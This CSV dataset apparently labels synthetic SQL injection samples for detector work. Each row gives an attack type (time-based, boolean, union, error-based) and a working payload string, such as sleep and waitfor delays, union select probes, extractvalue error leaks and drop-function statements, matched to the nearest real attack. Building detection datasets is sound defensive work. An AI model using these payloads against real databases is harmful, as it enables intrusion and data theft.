id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R003005,3.651508249976083
CTGAN_000002,attack,other, (  select   (  case when   (  9263  =  9263  )   then 1 else 9263*  (  select 9263 from mysql.db  )   end   )    ) ,nearest_attack_euclidean,R001248,3.6120491725397277
CTGAN_000003,attack,time,1'+  (  select 'hjku' where 1954  =  1954 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   +',nearest_attack_euclidean,R004731,4.60582889668301
CTGAN_000004,attack,boolean,"1  )   where 7748  =  7748 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R006303,3.8188556560145077
CTGAN_000005,attack,union,"-2605%'   )    )     )   union all select 4738,4738#",nearest_attack_euclidean,R004305,4.459641578292363
CTGAN_000006,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,5.980323101185343
CTGAN_000007,attack,error,-5313'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'wkkp' like 'wkkp,nearest_attack_euclidean,R005602,5.576816471881631
CTGAN_000008,attack,union,"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R003872,3.5926874327728564
CTGAN_000009,attack,other, union   (  select @@version  )   --,nearest_attack_euclidean,R000431,10.331635608404046
CTGAN_000010,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R003005,3.484098691459028
CTGAN_000011,attack,other,1' where 6116  =  6116,nearest_attack_euclidean,R001565,2.333220686824878
CTGAN_000012,attack,time,1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',nearest_attack_euclidean,R005935,39.8453574522543
CTGAN_000013,attack,union,"1'  )   union all select null,null,null,null#",nearest_attack_euclidean,R004140,2.4857096811898227
CTGAN_000014,attack,union,"-6778  )   as xutm where 6442  =  6442 union all select 6442,6442,6442,6442,6442,6442#",nearest_attack_euclidean,R008823,3.514580493797127
CTGAN_000015,attack,error,"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R008355,4.561356322203002
CTGAN_000016,attack,boolean,"1'  )   and make_set  (  7187  =  4625,4625  )   and   (  'diai' like 'diai",nearest_attack_euclidean,R006984,2.8483530088536284
CTGAN_000017,attack,other,"  (  select concat  (  0x7171706a71,  (  select   (  elt  (  7381  =  7381,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R008477,5.537198449524326
CTGAN_000018,attack,error,"1' in boolean mode  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #",nearest_attack_euclidean,R007392,2.8614021719357465
CTGAN_000019,attack,other,1'   )    )    as eymg where 7000  =  7000,nearest_attack_euclidean,R000829,3.3435615927158002
CTGAN_000020,attack,union,"-1390%""   )    )    union all select 8930,8930,8930,8930,8930#",nearest_attack_euclidean,R001942,7.031709026207193
CTGAN_000021,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",nearest_attack_euclidean,R006250,3.76772027671837
CTGAN_000022,attack,error,"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'cfhi' like 'cfhi",nearest_attack_euclidean,R006290,1.9573331642632286
CTGAN_000023,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R005048,4.094720148049012
CTGAN_000024,attack,boolean,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,nearest_attack_euclidean,R003160,3.256045773155805
CTGAN_000025,attack,error,"1'||  (  select 'fzcu' where 9252  =  9252 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   ||'",nearest_attack_euclidean,R006154,5.496045159767379
CTGAN_000026,attack,time,1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R003344,4.854281270549364
CTGAN_000027,attack,other, (  select   (  case when   (  5792  =  5792  )   then 5792 else 1/  (  select 0  )   end   )    ) ,nearest_attack_euclidean,R004608,3.596806709059929
CTGAN_000028,attack,boolean,"1 where 5382  =  5382 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R006345,3.3210647197643257
CTGAN_000029,attack,error,"1'   )    )    as bsvk where 5985  =  5985 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R003346,2.9800976294297805
CTGAN_000030,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R002270,3.248658758269838
CTGAN_000031,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R004944,4.9928520408293675
CTGAN_000032,attack,union,"-9566%""  )   union all select 7973,7973,7973,7973--",nearest_attack_euclidean,R002875,6.619554316458273
CTGAN_000033,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R005201,2.8930210577255324
CTGAN_000034,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R002638,3.495760206417487
CTGAN_000035,attack,union,"-3205""  )   union all select 5233,5233,5233,5233#",nearest_attack_euclidean,R006281,5.546878957843666
CTGAN_000036,attack,other,1  )   as nmlm where 9872  =  9872,nearest_attack_euclidean,R005215,1.0952074270469017
CTGAN_000037,attack,other,"1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",nearest_attack_euclidean,R007006,3.11524292284192
CTGAN_000038,attack,time,1' and sleep  (  5  ) ,nearest_attack_euclidean,R002468,2.4242495813250886
CTGAN_000039,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R002133,4.634838463335445
CTGAN_000040,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R007430,4.654689756505812
CTGAN_000041,attack,boolean,"-9133""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""crfy""  =  ""crfy",nearest_attack_euclidean,R008996,2.116618771399555
CTGAN_000042,attack,error,"1'   )    )    as kfnt where 8090  =  8090 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R007987,3.5416863339718616
CTGAN_000043,attack,union,"1""  )   union all select null,null,null,null#",nearest_attack_euclidean,R001763,2.6943314086648713
CTGAN_000044,attack,other,"1""   )    )    as ikuz where 7385  =  7385",nearest_attack_euclidean,R007448,1.2169631043248177
CTGAN_000045,attack,other,1' where 7036  =  7036,nearest_attack_euclidean,R001285,1.5183311996580777
CTGAN_000046,attack,union," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000455,5.365490467334805
CTGAN_000047,attack,time,"1""   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R002680,3.947102770515899
CTGAN_000048,attack,union,"-2725"" union all select 3671,3671,3671,3671,3671#",nearest_attack_euclidean,R006278,3.7514240357868482
CTGAN_000049,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000182,6.02269559942068
CTGAN_000050,attack,time,1%'  )   or sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R001645,3.3049360925456077
CTGAN_000051,attack,boolean,1%' rlike   (  select   (  case when   (  3596  =  4245  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R004426,3.5106995191845662
CTGAN_000052,attack,boolean,"1'  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R006511,2.372813641957536
CTGAN_000053,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R008306,3.307675847009491
CTGAN_000054,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R003450,3.226247505485433
CTGAN_000055,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",nearest_attack_euclidean,R000867,2.0880612776547274
CTGAN_000056,attack,boolean,"1""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""kzcd""  =  ""kzcd",nearest_attack_euclidean,R008021,4.0251175927321245
CTGAN_000057,attack,boolean,-3186 or 3867  =  9405,nearest_attack_euclidean,R003609,1.670740015801687
CTGAN_000058,attack,other,""" or """" """,nearest_attack_euclidean,R000286,6.501016143669792
CTGAN_000059,attack,error,1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf,nearest_attack_euclidean,R005964,4.574806122818534
CTGAN_000060,attack,boolean,"-5161%"" or   (  1437  =  4869  )  *4869 and ""%""  =  """,nearest_attack_euclidean,R004489,3.9652752762887085
CTGAN_000061,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R006675,3.3614029733065225
CTGAN_000062,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,19.478125412189094
CTGAN_000063,attack,error,"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  6986  =  6986",nearest_attack_euclidean,R007062,2.247748425873727
CTGAN_000064,attack,boolean,"1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'",nearest_attack_euclidean,R003189,3.5214912884324296
CTGAN_000065,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",nearest_attack_euclidean,R006341,4.270370929843632
CTGAN_000066,attack,union,"1'  )   as ghks where 5128  =  5128 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R002501,4.739139441269635
CTGAN_000067,attack,boolean,"1   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   9333  =  9333",nearest_attack_euclidean,R003519,2.8325837427864857
CTGAN_000068,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R008206,2.5167811743878694
CTGAN_000069,attack,union,"-5891  )   where 5792  =  5792 union all select 5792,5792,5792,5792,5792#",nearest_attack_euclidean,R004834,2.415779875488046
CTGAN_000070,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R008155,3.7697317734054274
CTGAN_000071,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7711  =  7711",nearest_attack_euclidean,R005222,5.006770317371732
CTGAN_000072,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,1.9309890158941498
CTGAN_000073,attack,other,1   )    )    as muyz where 6105  =  6105,nearest_attack_euclidean,R000889,0.8514588047150241
CTGAN_000074,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R006986,7.893479679072387
CTGAN_000075,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R001026,3.3678108241959324
CTGAN_000076,attack,error,"1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R001472,4.655607948587206
CTGAN_000077,attack,error,"1'||  (  select 'mgel' where 3591  =  3591 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R006590,4.907555273885999
CTGAN_000078,attack,time,"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo",nearest_attack_euclidean,R001955,4.871081241590491
CTGAN_000079,attack,boolean,"1%""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R001144,3.774555327746676
CTGAN_000080,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R003179,2.8676140332573268
CTGAN_000081,attack,other,""" or """" """,nearest_attack_euclidean,R000286,5.123426452109783
CTGAN_000082,attack,other,"1,  (  case when 5514  =  9602 then 1 else null end  )  ",nearest_attack_euclidean,R008056,2.815976745676986
CTGAN_000083,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R001009,2.835245885079307
CTGAN_000084,attack,boolean,"1%""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003483,3.1091185328895317
CTGAN_000085,attack,boolean,"1%"" and elt  (  4249  =  4249,7259  )   and ""%""  =  """,nearest_attack_euclidean,R001854,2.7491698243374314
CTGAN_000086,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R008430,5.217293034085446
CTGAN_000087,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R003853,3.505423013447624
CTGAN_000088,attack,boolean,"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R003365,1.589033881345504
CTGAN_000089,attack,boolean,"1'||  (  select 'dbxr' where 4014  =  4014 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002840,2.7567332903149664
CTGAN_000090,attack,other,"admin"" #",nearest_attack_euclidean,R000523,3.92629538448651
CTGAN_000091,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R001208,4.061641890683641
CTGAN_000092,attack,union," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",nearest_attack_euclidean,R000261,4.194142518823809
CTGAN_000093,attack,other,"1""  )   as frmp where 6073  =  6073",nearest_attack_euclidean,R003308,1.4358585286823506
CTGAN_000094,attack,other,1'||  (  select 'cfff' where 4994  =  4994,nearest_attack_euclidean,R001799,1.917278499628195
CTGAN_000095,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,nearest_attack_euclidean,R007347,3.947164197345635
CTGAN_000096,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R007603,3.7625210542705596
CTGAN_000097,attack,other,1   )    )    as cwyb where 3633  =  3633,nearest_attack_euclidean,R003367,1.8820762807401816
CTGAN_000098,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""gxhz""  =  ""gxhz",nearest_attack_euclidean,R006685,5.649865308067978
CTGAN_000099,attack,time,1'  )   as irck where 3660  =  3660 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R008511,17.694250096307613
CTGAN_000100,attack,error,"-7184  )   as fshx where 3408  =  3408 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R003001,4.505966810478412
CTGAN_000101,attack,time,waitfor delay '0:0:5' and    (    (     (  'ozjl' like 'ozjl,nearest_attack_euclidean,R005892,3.9098607214966883
CTGAN_000102,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  7813  =  7813",nearest_attack_euclidean,R002736,3.4696328229541527
CTGAN_000103,attack,boolean,"1%'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '",nearest_attack_euclidean,R007697,5.787072823338687
CTGAN_000104,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R003939,6.325725115091686
CTGAN_000105,attack,union,"1""   )    )     )   union all select null,null--",nearest_attack_euclidean,R003810,4.2033180820034834
CTGAN_000106,attack,boolean,"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri",nearest_attack_euclidean,R003337,2.646094883584636
CTGAN_000107,attack,time,1 where 7299  =  7299 rlike sleep  (  5  )  --,nearest_attack_euclidean,R004155,3.247486932276379
CTGAN_000108,attack,boolean,"-1598""   )    )    or elt  (  5329  =  9628,9628  )   and    (    (   ""hyxq"" like ""hyxq",nearest_attack_euclidean,R005841,2.382864655833204
CTGAN_000109,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R007185,4.092454688276781
CTGAN_000110,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,7.284508505146005
CTGAN_000111,attack,other,1   )    )    as muyz where 6105  =  6105,nearest_attack_euclidean,R000889,7.871511555691598
CTGAN_000112,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R007185,4.384703337434495
CTGAN_000113,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'kwhs' like 'kwhs",nearest_attack_euclidean,R000790,2.5841129170149713
CTGAN_000114,attack,error,"1'  )   as hlbq where 2347  =  2347 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R006016,5.388074300969779
CTGAN_000115,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,2.4435753847775166
CTGAN_000116,attack,boolean,1'+  (  select 'xqjx' where 7048  =  7048 and 9198  =  9198--,nearest_attack_euclidean,R002001,2.6741563286444014
CTGAN_000117,attack,union,"1%""  )   union all select null,null,null,null--",nearest_attack_euclidean,R002266,7.392286455313827
CTGAN_000118,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R005166,3.8614858091099737
CTGAN_000119,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,3.593758403085932
CTGAN_000120,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000155,7.838762532521198
CTGAN_000121,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000991,4.640808599268219
CTGAN_000122,attack,other,-8641%' order by 1--,nearest_attack_euclidean,R003417,4.674417293007202
CTGAN_000123,attack,error,"1'   )    )    as lxjs where 6503  =  6503 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R006605,3.6327401956036307
CTGAN_000124,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R008406,3.0714052315807128
CTGAN_000125,attack,other,if  (  4907  =  9581  )   select 4907 else drop function apqw--,nearest_attack_euclidean,R008010,2.742351830704345
CTGAN_000126,attack,other,1'  )   as pudv where 2609  =  2609,nearest_attack_euclidean,R002866,0.9916023469014593
CTGAN_000127,attack,boolean,"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R006418,3.559791200320879
CTGAN_000128,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  1748  =  1748",nearest_attack_euclidean,R000727,5.508393976183581
CTGAN_000129,attack,other,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R007040,4.1310630922086915
CTGAN_000130,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'nczi'  =  'nczi",nearest_attack_euclidean,R007610,8.69401389755843
CTGAN_000131,attack,boolean,1'||  (  select 'rjun' where 8868  =  8868 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||',nearest_attack_euclidean,R008780,6.192094678429429
CTGAN_000132,attack,error,"-8021'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cenk' like 'cenk",nearest_attack_euclidean,R003292,5.3106873081493715
CTGAN_000133,attack,other,"  (  select   (  case when   (  3531  =  3531  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 3531 end   )    )   ",nearest_attack_euclidean,R003079,6.89119327106093
CTGAN_000134,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,nearest_attack_euclidean,R001041,4.265113399764486
CTGAN_000135,attack,other,"1"" where 9230  =  9230",nearest_attack_euclidean,R001494,1.6215709517888806
CTGAN_000136,attack,error,"1,  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",nearest_attack_euclidean,R008800,4.213671460018742
CTGAN_000137,attack,error,1'||  (  select 'hlxd' from dual where 2615  =  2615 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',nearest_attack_euclidean,R004288,3.5909616716961246
CTGAN_000138,attack,other,"select count  (  *  )   from generate_series  (  1,5000000  )  --",nearest_attack_euclidean,R001370,3.557579974309809
CTGAN_000139,attack,union,"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",nearest_attack_euclidean,R007873,3.4671182895150303
CTGAN_000140,attack,boolean,1   )    )     )   and 9198  =  9198--,nearest_attack_euclidean,R004741,6.0003173394517235
CTGAN_000141,attack,time,1'+  (  select mrdi where 7451  =  7451 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R004559,4.36025097270745
CTGAN_000142,attack,time,"make_set  (  8734  =  8734,sleep  (  5   )    )   ",nearest_attack_euclidean,R008151,3.3773832820460057
CTGAN_000143,attack,other,1' where 8584  =  8584 order by 1#,nearest_attack_euclidean,R008437,3.759362207812775
CTGAN_000144,attack,other,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3--",nearest_attack_euclidean,R001572,4.0350519338553035
CTGAN_000145,attack,other,1' where 6116  =  6116,nearest_attack_euclidean,R001565,1.038983415153947
CTGAN_000146,attack,time,"1"" and sleep  (  5  )  ",nearest_attack_euclidean,R005102,2.336317823758564
CTGAN_000147,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000982,3.3863841506472245
CTGAN_000148,attack,other,   (  select top 1,nearest_attack_euclidean,R000225,2.4413178435142955
